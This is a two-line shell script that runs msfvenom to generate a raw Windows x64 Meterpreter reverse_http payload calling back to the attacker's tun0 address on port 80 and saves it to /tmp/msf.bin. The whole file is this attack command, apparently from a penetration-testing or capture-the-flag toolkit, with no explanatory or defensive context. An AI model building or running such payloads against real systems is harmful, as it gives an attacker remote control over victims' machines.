#!/bin/sh
msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=80 LURI=/MSF EXITFUNC=thread -f raw -o /tmp/msf.bin
